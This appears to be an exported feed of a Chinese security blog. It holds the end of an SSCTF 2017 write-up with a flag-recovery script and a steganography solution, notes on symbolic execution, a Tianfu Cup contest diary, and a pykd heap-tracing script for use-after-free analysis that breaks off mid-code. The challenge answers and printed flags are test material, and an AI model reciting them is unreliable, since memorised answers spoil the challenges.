<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L[flag[0] &gt;&gt; 2] &#x3D; res[0] ^ 0x3F</span><br><span class="line">L[flag[1] &gt;&gt;4 + flag[0]&lt;&lt;4 &amp; 0x3f] &#x3D; res[1] ^0xf</span><br><span class="line">L[flag[1]&lt;&lt;2&amp;0x3f + flag[2] &gt;&gt;6] &#x3D; res[2]</span><br><span class="line">L[flag[2] &amp;0x3f] &#x3D; res[3]</span><br></pre></td></tr></table></figure>

<p>写脚本做还原操作就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = [<span class="number">0x01</span>,<span class="number">0x63</span>,<span class="number">0x5e</span>,<span class="number">0x6c</span>,</span><br><span class="line">	   <span class="number">0x5f</span>,<span class="number">0x23</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,</span><br><span class="line">	   <span class="number">0x5f</span>,<span class="number">0x27</span>,<span class="number">0x35</span>,<span class="number">0x6c</span>,</span><br><span class="line">	   <span class="number">0x11</span>,<span class="number">0x66</span>,<span class="number">0x31</span>,<span class="number">0x65</span>]</span><br><span class="line"></span><br><span class="line">final = [<span class="number">0x21</span>, <span class="number">0x3A</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2B</span>,</span><br><span class="line">		<span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x2F</span>, <span class="number">0x60</span>, <span class="number">0x7E</span>, <span class="number">0x5F</span>, <span class="number">0x5B</span>, <span class="number">0x5D</span>, <span class="number">0x7B</span>,</span><br><span class="line">		<span class="number">0x7D</span>, <span class="number">0x3F</span>, <span class="number">0x3C</span>, <span class="number">0x3E</span>, <span class="number">0x2C</span>, <span class="number">0x2E</span>, <span class="number">0x40</span>, <span class="number">0x5E</span>, <span class="number">0x61</span>,</span><br><span class="line">		<span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>,</span><br><span class="line">		<span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>,</span><br><span class="line">		<span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7A</span>, <span class="number">0x30</span>, <span class="number">0x31</span>,</span><br><span class="line"> 		<span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x5C</span>,</span><br><span class="line">		<span class="number">0x27</span>, <span class="number">0x3B</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">L[flag[0] &gt;&gt; 2] = res[0] ^ 0x3F</span></span><br><span class="line"><span class="string">L[flag[1] &gt;&gt;4 + flag[0]&lt;&lt;4 &amp; 0x3f] = res[1] ^0xf</span></span><br><span class="line"><span class="string">L[flag[1]&lt;&lt;2&amp;0x3f + flag[2] &gt;&gt;6] = res[2]</span></span><br><span class="line"><span class="string">L[flag[2] &amp;0x3f] = res[3]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index</span>(<span class="params">target</span>):</span></span><br><span class="line">	<span class="keyword">return</span> final.index(target)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span>():</span></span><br><span class="line">	flag = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(res),<span class="number">4</span>):</span><br><span class="line">		ch0 = ((get_index(res[i] ^ <span class="number">0x3f</span>) &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xff</span>)+(get_index(res[i+<span class="number">1</span>] ^ <span class="number">0xf</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line">		flag.append(ch0)</span><br><span class="line">		ch1 = ((get_index(res[i+<span class="number">1</span>] ^ <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) + (get_index(res[i+<span class="number">2</span>]) &gt;&gt; <span class="number">2</span>)</span><br><span class="line">		flag.append(ch1)</span><br><span class="line">		ch2 = ((get_index(res[i+<span class="number">2</span>]) &lt;&lt; <span class="number">6</span> ) &amp; <span class="number">0xff</span>) + get_index(res[i+<span class="number">3</span>])</span><br><span class="line">		flag.append(ch2)</span><br><span class="line">	<span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">out = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> fuck():</span><br><span class="line">	out += <span class="built_in">chr</span>(ch)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> out</span><br><span class="line"><span class="comment">#VVe1lD0ne^-^</span></span><br></pre></td></tr></table></figure>

<p>安装apk到手机上，然后输入得到的字符串，得到flag</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/apk2.png"></p>
<h4 id="Music-300-你知道我在等你吗"><a href="#Music-300-你知道我在等你吗" class="headerlink" title="Music 300 你知道我在等你吗"></a>Music 300 你知道我在等你吗</h4><p>拿到一个mp3，先binwalk看了一下：</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-0.png"></p>
<p>zip啊，手动修改文件后缀为zip，然后直接解压得到如下：</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-1.png"></p>
<p>二维码并没有什么卵用…coffee是加密的zip，把mp3丢进010 editor，发现后面多了一部分数据，strings之后得到一个有点奇怪的字符串：</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-2.png"></p>
<p>尝试使用它解密zip…居然可以 :)</p>
<p>解开之后有个coffee.jpg</p>
<p>惯例使用binwalk扫一下：</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-3.png"></p>
<p>并没有什么特别的地方。</p>
<p>在使用010 editor查看的时候，搜了下一些其他文件的文件头里的标志字符之类的，发现了：</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-4.png"></p>
<p>前面的coffee也好奇怪，从coffee开始截取出来，找了个png头，尝试修复一下，然后打开：</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-5.png"></p>
<p>得到一个二维码，扫一下，是让你去下载一个txt…其实这是个zip，但是后面拼接了一部分提示的字符串。</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-6.png"></p>
<p>简直….丧心病狂。</p>
<p>猜了好多密码…什么coffee、seclover之类的，差点要爆破了。后面队友提示说要不要试试伪加密。</p>
<p>直接丢进010 editor 使用二进制模板解析后，修改标志位</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-7.png"></p>
<p>然后尝试解压得到一个txt，里面是一串base64</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/ssctf2017writeup/music3-8.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keyis%7Bsec1over%25_6ugscan_@coffee%7D</span><br><span class="line">#keyis&#123;sec1over%_6ugscan_@coffee&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Snell auto install cript</title>
    <url>/2019/09/26/Snell-auto-install-cript/</url>
    <content><![CDATA[<h2 id="0x00-Snell"><a href="#0x00-Snell" class="headerlink" title="0x00 : Snell"></a>0x00 : Snell</h2><p>Snell是Surge支持的一种**协议，但是server并不开源，也就是说只有Surge客户端才能用。</p>
<a id="more"></a>

<p>琢磨了下写了个自动化的配置脚本。</p>
<h2 id="0x01-Script"><a href="#0x01-Script" class="headerlink" title="0x01 : Script"></a>0x01 : Script</h2><p><a href="https://gist.github.com/o0xmuhe/c8d548037f42e651595af79408e299a2">snel.sh</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Snell</tag>
        <tag>Surge</tag>
      </tags>
  </entry>
  <entry>
    <title>Symbolic Execution学习</title>
    <url>/2018/02/16/Symbolic-Execution%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00: 前言"></a>0x00: 前言</h4><p>学习的时候做个记录，看过什么，踩过什么坑之类的。</p>
<a id="more"></a>

<h4 id="0x01-资料"><a href="#0x01-资料" class="headerlink" title="0x01: 资料"></a>0x01: 资料</h4><h5 id="1-paper-amp-amp-不错的文章"><a href="#1-paper-amp-amp-不错的文章" class="headerlink" title="1. paper &amp;&amp; 不错的文章"></a>1. paper &amp;&amp; 不错的文章</h5><p>《All You Ever Wanted to Know about Dynamic Taint Analysis and Forward Symbolic Execution (but Might Have Been Afraid to Ask)》</p>
<p>《Symbolic execution for software testing: three decades later》</p>
<p><a href="https://zhuanlan.zhihu.com/p/26927127">符号执行入门</a></p>
<h5 id="2-项目"><a href="#2-项目" class="headerlink" title="2. 项目"></a>2. 项目</h5><p><a href="https://github.com/chyyuu/symexe/blob/master/klee_document/klee_analysis.md">KLEE</a></p>
<p><a href="https://github.com/Z3Prover/z3">Z3</a></p>
<p><a href="https://github.com/angr">Angr</a></p>
<h4 id="3-一些资源"><a href="#3-一些资源" class="headerlink" title="3. 一些资源"></a>3. 一些资源</h4><h5 id="3-1-z3"><a href="#3-1-z3" class="headerlink" title="3.1 z3"></a>3.1 z3</h5><p>主要是解决一些CTF题目。</p>
<ol>
<li><p><a href="https://zhuanlan.zhihu.com/p/30548907">Z3一把梭：用约束求解搞定一类CTF题</a></p>
</li>
<li><p><a href="https://blog.csdn.net/s1054436218/article/details/78651075">使用z3约束器解决CTF中的题目</a></p>
</li>
<li><p><a href="https://github.com/sam-b/z3-stuff/blob/master/a-bug-hunters-constraint-solver/README.md?1524556640719">z3-stuf</a></p>
</li>
</ol>
<h5 id="3-2-angr"><a href="#3-2-angr" class="headerlink" title="3.2 angr"></a>3.2 angr</h5><ol>
<li><p><a href="https://github.com/angr/angr-doc">angr-doc</a></p>
<p> 使用angr解决一些ctf题目，这部分直接参考angr-doc里的examples就好了。</p>
</li>
<li><p><a href="https://github.com/jakespringer/angr_ctf">angr-ctf</a></p>
<p> 很好的入门资料，各种基础用法都有demo，注释很全面，跟着学习就好了。<br> 环境建议：Linux + virtualenv</p>
</li>
<li><p>关注各大ctf中wp</p>
</li>
</ol>
<h5 id="4-实践demo"><a href="#4-实践demo" class="headerlink" title="4. 实践demo"></a>4. 实践demo</h5><h5 id="1-mini-mc"><a href="#1-mini-mc" class="headerlink" title="1. mini mc"></a>1. <a href="https://github.com/xiw/mini-mc">mini mc</a></h5><p>This directory contains a “minimal” implementation to demonstrate<br>the basic ideas of symbolic execution and concolic execution, using<br>Z3’s Python interface. </p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Study</tag>
        <tag>Symbolic Execution</tag>
      </tags>
  </entry>
  <entry>
    <title>TFC游记</title>
    <url>/2018/11/18/TFC%E6%B8%B8%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="0x00-：前言"><a href="#0x00-：前言" class="headerlink" title="0x00 ：前言"></a>0x00 ：前言</h4><p>很幸运能随团队一起参加中国版pwn2own–天府杯国际破解大赛。对于我这样一个刚毕业几个月的菜鸟来说，真的是见了大世面，也从这个经历、随行的同事身上学到了很多东西，对于自己而言，我认为这次经历是加速自身成长的神奇药剂。</p>
<a id="more"></a>



<h4 id="0x01-：赶赴成都"><a href="#0x01-：赶赴成都" class="headerlink" title="0x01 ：赶赴成都"></a>0x01 ：赶赴成都</h4><p>11月15日跟随大部队乘坐早上7:45的飞机从北京赶往成都，正好前一天北京雾霾严重，可以说是去蓉城躲一躲了 23333。</p>
<p>作为一个菜鸟，跟着大佬们就对了，到了成都之后，吃完午饭大家就快速赶往了赛场做前期准备工作，比如环境的查看工作。  不得不说，会场真的太太太太太太太太大了，酒店距离会场真的太远了，16km简直是噩梦，太不方便了。</p>
<p>晚上回到酒店后，在古先生的带领下大家去吃了跷脚牛肉，在北京待得时间长了，大家都吃不了太辣。 我还是个愣头青，我觉得我才从成都过去几个月，我应该可以，结果晚上睡觉的时候，胃里热辣辣的感觉告诉我，too young啊少年。</p>
<h4 id="0x02-：-比赛日-day1"><a href="#0x02-：-比赛日-day1" class="headerlink" title="0x02 ： 比赛日 day1"></a>0x02 ： 比赛日 day1</h4><p>因为是破解大赛，大家都是揣着0day(s)来到会场的，古先生再三提醒，千万看好自己的包、电脑，互相帮忙看住。那段时间感觉警惕性达到顶峰，一个声称自己是360市场部的同事来坐到我们桌子这边时候，我第一反应是怀疑他到底是不是真的，有啥目的😢。</p>
<p>早上9:30开始的是重头戏，抽签。老早就听说，这种比赛最重要的就是抽签，签序能影响很多，但是前提是：你必须有足够的储备，你必须有足够的储备，你必须有足够的储备。</p>
<p>因为策略，男哥、我、团队，我们报了三个PDF项目，没想到似乎是微博抽奖的锦鲤属性，我PDF抽到第一个，团队的是第二个（这个时候感觉自己在做梦…这也太棒了吧！)。不得不说，day1真的是我们的幸运日，几乎所有大项都抽到了第一个，只有龚神的一个小米8排到了最后 :( </p>
<p>我们团队从edge开始打，毫无悬念的一次通；然后是龚神的Chrome，一次就成，太强了；之后我跟着男哥去打了PDF，从杨博士双击1.pdf那个文件开始，呼吸加速，默默祈求着calc你快出来，reader卡了几秒之后，calc直接弹出，破解成功！之后就是和厂商、内场裁判一起review了，确定你的漏洞真实有效。这个过程有点漫长，adobe来的那个老哥貌似不是做技术的，验证了好久 :( 。 </p>
<p>之后团队的PDF也成功打下，龙哥的Safari也顺利拿下…后面肖伟哥和天文的VirtualBox、VMware顺利搞定。</p>
<p>男哥的PDF在day2，他紧急回酒店忙相关的事情。后面因为没我什么事我就先去和李专家(L3m0n)以及学弟吃晚饭了，火锅接近尾声的时候，男哥那边有些情况，我就直接打车回了酒店找他，希望可以帮上一些忙。 不得不说这次被出租车师傅坑了，不打表直接开价不说，中间还加了一次价格，我想看副驾上有啥信息，车牌、电话啥的，想投诉的时候缺发现啥也没有，遂放弃，还是赶紧回去找男哥汇合，别耽误正事。</p>
<h4 id="0x03-：-比赛日-day2"><a href="#0x03-：-比赛日-day2" class="headerlink" title="0x03 ： 比赛日 day2"></a>0x03 ： 比赛日 day2</h4><p>因为第一天奠定的巨大优势，没必要再浪费漏洞，就放弃了一些项目。就只有大宝师傅的Safari和iPhone x rjb。</p>
<p>大宝师傅打完之后，后面就没什么看的了，涅槃团队的Safari+穿sandbox，因为Safari撞洞，所以只有穿sandbox的分数，很可惜吧。</p>
<p>后面颁奖没啥好说的了，大宝师傅的优秀个人，天文的最牛技术，实至名归，都很厉害，都是我学习的榜样。 </p>
<h4 id="0x04-：一些感想"><a href="#0x04-：一些感想" class="headerlink" title="0x04 ：一些感想"></a>0x04 ：一些感想</h4><p>首先是陈少公开夸奖大宝。 这种无公司界限的纯技术上的赞赏，真的让人有种“英雄惜英雄”的感觉，虽然这句话不是很正确，但是总就感觉很棒。 我一直觉得，大宝师傅算是同龄人里的一个标杆，在安全研究上的工作，以及他的想法、态度，都值得我去学习。</p>
<p>我们小组流传着一句：寻找大师，追随大师，成为大师，超越大师，以及tk教主很早以前说的，在同龄人里找一个标杆，行业前辈中再找一个标杆（大概这样的意思吧），我认为综合起来，现在都找到了。希望在安全的道路上，可以早点看到前辈们的车尾灯，希望可以早点追赶上他们。</p>
<p>比赛结束就结束了，结束之后和男哥沟通了很多，不得不感叹工作后遇到男哥这样的导师真的是太幸运了，男哥真的是我的贵人。 后续的工作也有一个大概的规划了，以及对以后一个发展方向有了更清楚的认识，前辈们思考问题的维度、深度的确是高了几个层次，这些还需要慢慢学习。男哥说，安全这条路，你就算有天赋也要堆时间。这话很对，更何况我这样没有天赋的凡人，需要的不仅仅是时间，还有努力努力再努力 :) </p>
<p>至于赛场外的一些事，我觉得没什么好说的，团队里的大佬也没说什么，可能大家见得多了，已经很佛系了。</p>
<p>在我还在学校的时候，pwn2own还能参加的时候，从来没有听说过、看到过，360这边因为签序、撞洞的事各种diss，像是受了天大的委屈。签序只是运气问题，撞洞就是储备问题了，与他人无关。</p>
<p>至于你们说报名多队伍，第一，这完全在规则允许的范围之内，而且我们也没撞洞啥的；第二，这招谁开始玩的溜呢？ :)</p>
<p>这几天其实蛮精彩的，不过作为小菜鸟也不敢多说什么，只是发现，高级别的大佬之间，格局的差距原来可以这么大。</p>
<p>翻篇了翻篇了，该开始新的工作了，努力创造更多的价值，希望后面自己可以产出更多0day，更多exploit。</p>
<p><code>Live long and pwn</code></p>
<p>最后，放个图</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/TFC/faker.jpg" alt="faker"></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>感想</tag>
      </tags>
  </entry>
  <entry>
    <title>UAF analysis : using pykd</title>
    <url>/2018/11/07/UAF-analysis-using-pykd/</url>
    <content><![CDATA[<h4 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 : 简介"></a>0x01 : 简介</h4><p>分析一些情况比较复杂的UAF漏洞时，比如很多次分配、使用内存，费力寻找被UAF的对象的释放点，是比较麻烦的(对于我这种菜逼来说)，这时候可以使用pykd来辅助这个工作，能使得漏洞分析工作变得更轻松。 </p>
<a id="more"></a>



<h4 id="0x02-脚本模版"><a href="#0x02-脚本模版" class="headerlink" title="0x02 : 脚本模版"></a>0x02 : 脚本模版</h4><p>这个脚本的<a href="https://labs.mwrinfosecurity.com/blog/heap-tracing-with-windbg-and-python/">原始版本</a>在使用的时候有点问题，我本地测试的时候回调函数有点问题，不能正常使用。</p>
<p>后来咨询了无言学长之后，学长帮忙做了修改:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pykd</span><br><span class="line"></span><br><span class="line">return_reg = <span class="string">&quot;rax&quot;</span></span><br><span class="line">stack_pointer = <span class="string">&quot;rsp&quot;</span></span><br><span class="line">arch_bits = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span>(<span class="params">localAddr</span>):</span></span><br><span class="line">    res = pykd.dbgCommand(<span class="string">&quot;x &quot;</span> + localAddr)</span><br><span class="line">    result_count = res.count(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> result_count == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> localAddr + <span class="string">&quot; not found.&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> result_count &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[-] Warning, more than one result for&quot;</span>, localAddr</span><br><span class="line">    <span class="keyword">return</span> res.split()[<span class="number">0</span>].replace(<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RtlAllocateHeap(</span></span><br><span class="line"><span class="comment"># IN PVOID                HeapHandle,</span></span><br><span class="line"><span class="comment"># IN ULONG                Flags,</span></span><br><span class="line"><span class="comment"># IN ULONG                Size );</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handle_allocate_heap</span>(<span class="params">pykd.eventHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        addr = get_address(<span class="string">&quot;ntdll!RtlAllocateHeap&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> addr == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.bp_init = pykd.setBp(<span class="built_in">int</span>(addr, <span class="number">16</span>), self.enter_call_back)</span><br><span class="line">        self.bp_end = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter_call_back</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.out = <span class="string">&quot;RtlAllocateHeap(&quot;</span></span><br><span class="line">        <span class="keyword">if</span> arch_bits == <span class="number">32</span>:</span><br><span class="line">            esp = pykd.reg(stack_pointer)</span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.ptrPtr(esp + <span class="number">4</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.ptrMWord(esp + <span class="number">0x8</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.ptrMWord(esp + <span class="number">0xC</span>)) + <span class="string">&quot;) = &quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.reg(<span class="string">&quot;rcx&quot;</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.reg(<span class="string">&quot;rdx&quot;</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.reg(<span class="string">&quot;r8&quot;</span>)) + <span class="string">&quot;) = &quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.bp_end == <span class="literal">None</span>:</span><br><span class="line">            disas = pykd.dbgCommand(<span class="string">&quot;uf ntdll!RtlAllocateHeap&quot;</span>).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disas:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;ret&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">                    self.ret_addr = i.split()[<span class="number">0</span>].replace(<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.bp_end = pykd.setBp(<span class="built_in">int</span>(self.ret_addr, <span class="number">16</span>), self.return_call_back)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">return_call_back</span>(<span class="params">self</span>):</span></span><br><span class="line">        pykd.dprintln(self.out + <span class="built_in">hex</span>(pykd.reg(return_reg)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RtlFreeHeap(</span></span><br><span class="line"><span class="comment"># IN PVOID                HeapHandle,</span></span><br><span class="line"><span class="comment"># IN ULONG                Flags OPTIONAL,</span></span><br><span class="line"><span class="comment"># IN PVOID                MemoryPointer );</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handle_free_heap</span>(<span class="params">pykd.eventHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        addr = get_address(<span class="string">&quot;ntdll!RtlFreeHeap&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> addr == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.bp_init = pykd.setBp(<span class="built_in">int</span>(addr, <span class="number">16</span>), self.enter_call_back)</span><br><span class="line">        self.bp_end = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter_call_back</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.out = <span class="string">&quot;RtlFreeHeap(&quot;</span></span><br><span class="line">        <span class="keyword">if</span> arch_bits == <span class="number">32</span>:</span><br><span class="line">            esp = pykd.reg(stack_pointer)</span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.ptrPtr(esp + <span class="number">4</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.ptrMWord(esp + <span class="number">0x8</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.ptrPtr(esp + <span class="number">0xC</span>)) + <span class="string">&quot;) = &quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.reg(<span class="string">&quot;rcx&quot;</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.reg(<span class="string">&quot;rdx&quot;</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.reg(<span class="string">&quot;r8&quot;</span>)) + <span class="string">&quot;) = &quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.bp_end == <span class="literal">None</span>:</span><br><span class="line">            disas = pykd.dbgCommand(<span class="string">&quot;uf ntdll!RtlFreeHeap&quot;</span>).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disas:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;ret&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">                    self.ret_addr = i.split()[<span class="number">0</span>].replace(<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.bp_end = pykd.setBp(<span class="built_in">int</span>(self.ret_addr, <span class="number">16</span>), self.return_call_back)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">return_call_back</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># returns a BOOLEAN which is a byte under the hood</span></span><br><span class="line">        ret_val = <span class="built_in">hex</span>(pykd.reg(<span class="string">&quot;al&quot;</span>))</span><br><span class="line">        pykd.dprintln(self.out + ret_val + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RtlReAllocateHeap(</span></span><br><span class="line"><span class="comment"># IN PVOID                HeapHandle,</span></span><br><span class="line"><span class="comment"># IN ULONG                Flags,</span></span><br><span class="line"><span class="comment"># IN PVOID                MemoryPointer,</span></span><br><span class="line"><span class="comment"># IN ULONG                Size );</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handle_realloc_heap</span>(<span class="params">pykd.eventHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        addr = get_address(<span class="string">&quot;ntdll!RtlReAllocateHeap&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> addr == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.bp_init = pykd.setBp(<span class="built_in">int</span>(addr, <span class="number">16</span>), self.enter_call_back)</span><br><span class="line">        self.bp_end = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter_call_back</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.out = <span class="string">&quot;RtlReAllocateHeap(&quot;</span></span><br><span class="line">        <span class="keyword">if</span> arch_bits == <span class="number">32</span>:</span><br><span class="line">            esp = pykd.reg(stack_pointer)</span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.ptrPtr(esp + <span class="number">4</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.ptrMWord(esp + <span class="number">0x8</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.ptrPtr(esp + <span class="number">0xC</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.ptrMWord(esp + <span class="number">0x10</span>)) + <span class="string">&quot;) = &quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.reg(<span class="string">&quot;rcx&quot;</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.reg(<span class="string">&quot;rdx&quot;</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.reg(<span class="string">&quot;r8&quot;</span>)) + <span class="string">&quot; , &quot;</span></span><br><span class="line">            self.out += <span class="built_in">hex</span>(pykd.reg(<span class="string">&quot;r9&quot;</span>)) + <span class="string">&quot;) = &quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.bp_end == <span class="literal">None</span>:</span><br><span class="line">            disas = pykd.dbgCommand(<span class="string">&quot;uf ntdll!RtlReAllocateHeap&quot;</span>).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disas:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;ret&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">                    